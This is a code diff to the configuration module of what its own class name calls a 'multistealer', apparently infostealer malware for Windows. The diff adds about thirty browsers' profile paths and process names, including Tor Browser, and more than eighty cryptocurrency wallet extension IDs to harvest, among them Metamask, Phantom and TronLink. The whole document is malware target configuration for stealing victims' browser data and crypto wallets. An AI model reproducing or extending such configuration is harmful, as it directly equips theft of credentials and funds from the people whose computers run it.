@@ -9,15 +9,34 @@ user_profile = environ.get("USERPROFILE")
 user = getuser()
 user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
 
-
 class Browsers(Enum):
     CHROME = "Chrome"
+    CHROME_SXS = "Chrome SxS"
+    CHROME_BETA = "Chrome Beta"
+    CHROME_DEV = "Chrome Dev"
+    FIREFOX = "Firefox"
+    FIREFOX_DEV = "Firefox Developer Edition"
+    FIREFOX_NIGHTLY = "Firefox Nightly"
     OPERA_GX = "Opera GX"
     OPERA_DEFAULT = "Opera Default"
+    OPERA_NEON = "Opera Neon"
     EDGE = "Microsoft Edge"
+    EDGE_BETA = "Microsoft Edge Beta"
+    EDGE_DEV = "Microsoft Edge Dev"
     BRAVE = "Brave"
     VIVALDI = "Vivaldi"
     YANDEX = "Yandex"
+    YANDEX_BETA = "Yandex Beta"
+    SAFARI = "Safari"
+    TOR_BROWSER = "Tor Browser"
+    CENT = "Cent Browser"
+    DUCKDUCKGO = "DuckDuckGo Privacy Browser"
+    UC_BROWSER = "UC Browser"
+    QQ_BROWSER = "QQ Browser"
+    SOGOU_EXPLORER = "Sogou Explorer"
+    BAIDU_BROWSER = "Baidu Browser"
+    MI_BROWSER = "Mi Browser"
+    NAVER_WHALE = "Naver Whale"
 
 
 class ChromiumConfig:
@@ -37,30 +56,91 @@ class ChromiumConfig:
     BookmarksData = "Title: {0}\nUrl: {1}\n\n"
 
     WalletLogs = [
-        {
-            "name": "Metamask",
-            "folders": ["nkbihfbeogaeaoehlefnkodbefgpgknn", "djclckkglechooblngghdinmeemkbgci", "ejbalbakoplchlghecdalmeeeajnimhm"]
-        },
-        {
-            "name": "Phantom",
-            "folders": ["bfnaelmomeimhlpmgjnjophhpkkoljpa"]
-        },
-        {
-            "name": "Binance",
-            "folders": ["fhbohimaelbohpjbbldcngcnapndodjp"]
-        },
-        {
-            "name": "Coinbase",
-            "folders": ["hnfanknocfeofbddgcijnmhnfnkdnaad"]
-        },
-        {
-            "name": "Trust",
-            "folders": ["egjidjbpglichdcondbcbdnbeeppgdph"]
-        },
-        {
-            "name": "Exodus",
-            "folders": ["aholpfdialjgjfhomihkjbmgjidlcdno"]
-        }
+        {"name": "Metamask", "folders": ["nkbihfbeogaeaoehlefnkodbefgpgknn", "djclckkglechooblngghdinmeemkbgci",
+                                         "ejbalbakoplchlghecdalmeeeajnimhm"]},
+        {"name": "Phantom", "folders": ["bfnaelmomeimhlpmgjnjophhpkkoljpa"]},
+        {"name": "Binance", "folders": ["fhbohimaelbohpjbbldcngcnapndodjp"]},
+        {"name": "Coinbase", "folders": ["hnfanknocfeofbddgcijnmhnfnkdnaad"]},
+        {"name": "Trust", "folders": ["egjidjbpglichdcondbcbdnbeeppgdph"]},
+        {"name": "Exodus", "folders": ["aholpfdialjgjfhomihkjbmgjidlcdno"]},
+        {"name": "TronLink", "folders": ["ibnejdfjmmkpcnlpebklmnkoeoihofec"]},
+        {"name": "Klever Wallet", "folders": ["lmbifcmbofehdpolpdpnlcnanolnlkec"]},
+        {"name": "SafePal", "folders": ["lgmpcpglpngdoalbgeoldeajfclnhafa"]},
+        {"name": "Keplr", "folders": ["dmkamcknogkgcdfhhbddcghachkejeap"]},
+        {"name": "Rabby Wallet", "folders": ["acmacodkjbdgmoleebolmdjonilkdbch"]},
+        {"name": "Liquality", "folders": ["kpfopkelmapcoipemfendmdcghnegimn"]},
+        {"name": "XDEFI Wallet", "folders": ["hmeobnfnfcmdkdcmlblgagmfpfboieaf"]},
+        {"name": "Zerion", "folders": ["klghhnkeealcoffelmkihbbdjcacnbde"]},
+        {"name": "Math Wallet", "folders": ["afbcbjpbpfadlkmhmclhkeeodmamcflc"]},
+        {"name": "Terra Station", "folders": ["aiifbnbfobpmeekipheeijimdpnlpgpp"]},
+        {"name": "Sollet", "folders": ["kenkfeheacakafofbfocafoaihhgngdf"]},
+        {"name": "Ronin Wallet", "folders": ["fnjhmkhhmkbjkkabndcnnogagogbneec"]},
+        {"name": "Opera Crypto Wallet", "folders": ["lkdedbdeelgmiobamdcfecofecemggcm"]},
+        {"name": "Nifty Wallet", "folders": ["jbdaocneiiinmjbjlgalhcelgbejmnid"]},
+        {"name": "Guarda Wallet", "folders": ["hpglfhgfgnpfiolmihidefgehgidbdoj"]},
+        {"name": "MEW CX (MyEtherWallet)", "folders": ["nlbmnnijcnlegkjjpcfjclmcfggfefdm"]},
+        {"name": "Bitcoin.com Wallet", "folders": ["dkbihpbbekgnoimhbjpbnophkldbflpm"]},
+        {"name": "Edge Wallet", "folders": ["cgpadfamcgbmjaldfbikjlmmkcdcmfir"]},
+        {"name": "Coinomi", "folders": ["eadkhninbihbfgcmnmlkkfgmpgmfdgkb"]},
+        {"name": "Authereum", "folders": ["fcojkffnjejdbbodolhoikifpgfhfdfd"]},
+        {"name": "BitKeep", "folders": ["peekkbkkjpbejdppbjbholhdkcfofdcj"]},
+        {"name": "BlockFi", "folders": ["abcdnbpncccfbgljpogngfapglgojegb"]},
+        {"name": "Atomic Wallet", "folders": ["kfecckfjlddmfjdagmejobppncnlmjdk"]},
+        {"name": "Polkadot{.js}", "folders": ["mopnmbcafieddcagagdjlehmcpelfopb"]},
+        {"name": "Uniswap", "folders": ["gnciglmdocehhhbmpcbpkkdkpogjnhhn"]},
+        {"name": "PancakeSwap", "folders": ["ifgbinkersbmfkmijllchnephcphgdfl"]},
+        {"name": "SushiSwap", "folders": ["jbpkiekgejjbjdimbllommdjaeecbdhd"]},
+        {"name": "Curve Finance", "folders": ["ccnckbpgflfdlbeanedekhbcoclcgitd"]},
+        {"name": "Balancer", "folders": ["oeicfonpmkghpcmakjccbohnfkbjdkgg"]},
+        {"name": "1inch", "folders": ["oplhkmhgbcjpnokflceoflodhmapdfjh"]},
+        {"name": "Raydium", "folders": ["nhbmjnhnplgnggpefcachbelvutlmmjt"]},
+        {"name": "QuickSwap", "folders": ["faehkpghpmdhagdcflplkaiejjcbeceb"]},
+        {"name": "Serum", "folders": ["cajgdmggedifmaekojcnbcfleofmodfj"]},
+        {"name": "KyberSwap", "folders": ["opfoifmpblccefaafglmfklgiholceeo"]},
+        {"name": "Venom", "folders": ["ojggmchlghnjlapmfbnjholfjkiidbch"]},
+        {"name": "Sui", "folders": ["opcgpfmipidbgpenhmajoajpbobppdil"]},
+        {"name": "Martian", "folders": ["efbglgofoippbgcjepnhiblaibcnclgk"]},
+        {"name": "Tron", "folders": ["ibnejdfjmmkpcnlpebklmnkoeoihofec"]},
+        {"name": "Petra", "folders": ["ejjladinnckdgjemekebdpeokbikhfci"]},
+        {"name": "Pontem", "folders": ["phkbamefinggmakgklpkljjmgibohnba"]},
+        {"name": "Fewcha", "folders": ["ebfidpplhabeedpnhjnobghokpiioolj"]},
+        {"name": "Math", "folders": ["afbcbjpbpfadlkmhmclhkeeodmamcflc"]},
+        {"name": "Coin98", "folders": ["aeachknmefphepccionboohckonoeemg"]},
+        {"name": "Authenticator", "folders": ["bhghoamapcdpbohphigoooaddinpkbai"]},
+        {"name": "ExodusWeb3", "folders": ["aholpfdialjgjfhomihkjbmgjidlcdno"]},
+        {"name": "Core", "folders": ["agoakfejjabomempkjlepdflaleeobhb"]},
+        {"name": "Tokenpocket", "folders": ["mfgccjchihfkkindfppnaooecgfneiii"]},
+        {"name": "Solfare", "folders": ["bhhhlbepdkbapadjdnnojkbgioiodbic"]},
+        {"name": "Kaikas", "folders": ["jblndlipeogpafnldhgmapagcccfchpi"]},
+        {"name": "iWallet", "folders": ["kncchdigobghenbbaddojjnnaogfppfj"]},
+        {"name": "Yoroi", "folders": ["ffnbelfdoeiohenkjibnmadjiehjhajb"]},
+        {"name": "Jaxx Liberty", "folders": ["cjelfplplebdjjenllpjcblmjkfcffne"]},
+        {"name": "Wombat", "folders": ["amkmjjmmflddogmhpjloimipbofnfjih"]},
+        {"name": "Oxygen", "folders": ["fhilaheimglignddkjgofkcbgekhenbh"]},
+        {"name": "MEWCX", "folders": ["nlbmnnijcnlegkjjpcfjclmcfggfefdm"]},
+        {"name": "Guild", "folders": ["nanjmdknhkinifnkgdcggcfnhdaammmj"]},
+        {"name": "Saturn", "folders": ["nkddgncdjgjfcddamfgcmfnlhccnimig"]},
+        {"name": "HarmonyOutdated", "folders": ["fnnegphlobjdpkhecapkijjdkgcjhkib"]},
+        {"name": "Ever", "folders": ["cgeeodpfagjceefieflmdfphplkenlfk"]},
+        {"name": "KardiaChain", "folders": ["pdadjkfkgcafgbceimcpbkalnfnepbnk"]},
+        {"name": "PaliWallet", "folders": ["mgffkfbidihjpoaomajlbgchddlicgpn"]},
+        {"name": "BoltX", "folders": ["aodkkagnadcbobfpggfnjeongemjbjca"]},
+        {"name": "Liquality", "folders": ["kpfopkelmapcoipemfendmdcghnegimn"]},
+        {"name": "XDEFI", "folders": ["hmeobnfnfcmdkdcmlblgagmfpfboieaf"]},
+        {"name": "Nami", "folders": ["lpfcbjknijpeeillifnkikgncikgfhdo"]},
+        {"name": "MaiarDEFI", "folders": ["dngmlblcodfobpdpecaadgfbcggfjfnm"]},
+        {"name": "TempleTezos", "folders": ["ookjlbkiijinhpmnjffcofjonbfbgaoc"]},
+        {"name": "XMR.PT", "folders": ["eigblbgjknlfbajkfhopmcojidlgcehm"]},
+        {"name": "Crocobit", "folders": ["pnlfjmlcjdjgkddecgincndfgegkecke"]},
+        {"name": "Equal", "folders": ["blnieiiffboillknjnepogjhkgnoapac"]},
+        {"name": "Iconex", "folders": ["flpiciilemghbmfalicajoolhkkenfel"]},
+        {"name": "Mobox", "folders": ["fcckkdbjnoikooededlapcalpionmalo"]},
+        {"name": "Swash", "folders": ["cmndjbecilbocjfkibfbifhngkdmjgog"]},
+        {"name": "Starcoin", "folders": ["mfhbebgoclkghebffdldpobeajmbecfk"]},
+        {"name": "Slope", "folders": ["pocmplpaccanhmnllbbkpgfliimjljgo"]},
+        {"name": "Ton", "folders": ["nphplpgoakhhjchkkhmiggakijnkhfnd"]},
+        {"name": "Trust Wallet", "folders": ["egjidjbpglichdcondbcbdnbeeppgdph"]},
+        {"name": "XinPay", "folders": ["bocpokimicclpaiekenaeelehdjllofo"]}
     ]
 
 
@@ -74,6 +154,30 @@ class MultistealerConfig:
             "path": rf"{user_profile}\AppData\Local\Google\Chrome\User Data",
             "process": "chrome.exe"
         },
+        Browsers.CHROME_SXS: {
+            "path": rf"{user_profile}\AppData\Local\Google\Chrome SxS/User Data",
+            "process": "chrome.exe"
+        },
+        Browsers.CHROME_BETA: {
+            "path": rf"{user_profile}\AppData\Local\Google\Chrome Beta/User Data",
+            "process": "chrome.exe"
+        },
+        Browsers.CHROME_DEV: {
+            "path": rf"{user_profile}\AppData\Local\Google\Chrome Dev/User Data",
+            "process": "chrome.exe"
+        },
+        Browsers.FIREFOX: {
+            "path": rf"{user_profile}\AppData\Roaming\Mozilla\Firefox\Profiles",
+            "process": "firefox.exe"
+        },
+        Browsers.FIREFOX_DEV: {
+            "path": rf"{user_profile}\AppData\Roaming\Mozilla\Firefox Developer Edition\Profiles",
+            "process": "firefox.exe"
+        },
+        Browsers.FIREFOX_NIGHTLY: {
+            "path": rf"{user_profile}\AppData\Roaming\Mozilla\Firefox Nightly\Profiles",
+            "process": "firefox.exe"
+        },
         Browsers.OPERA_GX: {
             "path": rf"{user_profile}\AppData\Roaming\Opera Software\Opera GX Stable",
             "process": "opera.exe"
@@ -82,8 +186,20 @@ class MultistealerConfig:
             "path": rf"{user_profile}\AppData\Roaming\Opera Software\Opera Stable",
             "process": "opera.exe"
         },
+        Browsers.OPERA_NEON: {
+            "path": rf"{user_profile}\AppData\Roaming\Opera Software\Opera Neon\User Data\Default",
+            "process": "opera.exe"
+        },
         Browsers.EDGE: {
             "path": rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data",
+            "process": "msedge.exe"
+        },
+        Browsers.EDGE_BETA: {
+            "path": rf"{user_profile}\AppData\Local\Microsoft\Edge Beta\User Data",
+            "process": "msedge.exe"
+        },
+        Browsers.EDGE_DEV: {
+            "path": rf"{user_profile}\AppData\Local\Microsoft\Edge Dev\User Data",
             "process": "msedge.exe"
         },
         Browsers.BRAVE: {
@@ -98,7 +214,48 @@ class MultistealerConfig:
             "path": rf"{user_profile}\AppData\Local\Yandex\YandexBrowser\User Data",
             "process": "browser.exe"
         },
+        Browsers.YANDEX_BETA: {
+            "path": rf"{user_profile}\AppData\Local\Yandex\YandexBrowser Beta\User Data",
+            "process": "browser.exe"
+        },
+        Browsers.TOR_BROWSER: {
+            "path": rf"{user_profile}\AppData\Local\Tor Browser\Browser",
+            "process": "firefox.exe"  # Tor Browser базируется на Firefox
+        },
+        Browsers.CENT: {
+            "path": rf"{user_profile}\AppData\Local\CentBrowser\User Data",
+            "process": "centbrowser.exe"
+        },
+        Browsers.DUCKDUCKGO: {
+            "path": rf"{user_profile}\AppData\Local\DuckDuckGo\Browser\User Data",
+            "process": "duckduckgo.exe"
+        },
+        Browsers.UC_BROWSER: {
+            "path": rf"{user_profile}\AppData\Local\UC Browser\User Data",
+            "process": "ucbrowser.exe"
+        },
+        Browsers.QQ_BROWSER: {
+            "path": rf"{user_profile}\AppData\Local\Tencent\QQBrowser\User Data",
+            "process": "qqbrowser.exe"
+        },
+        Browsers.SOGOU_EXPLORER: {
+            "path": rf"{user_profile}\AppData\Local\SogouExplorer\User Data",
+            "process": "sogouexplorer.exe"
+        },
+        Browsers.BAIDU_BROWSER: {
+            "path": rf"{user_profile}\AppData\Local\Baidu\BaiduBrowser\User Data",
+            "process": "baidubrowser.exe"
+        },
+        Browsers.MI_BROWSER: {
+            "path": rf"{user_profile}\AppData\Local\Xiaomi\MiBrowser\User Data",
+            "process": "mibrowser.exe"
+        },
+        Browsers.NAVER_WHALE: {
+            "path": rf"{user_profile}\AppData\Local\Naver\Whale\User Data",
+            "process": "whale.exe"
+        }
     }
+
 
 
 class SystemConfig:
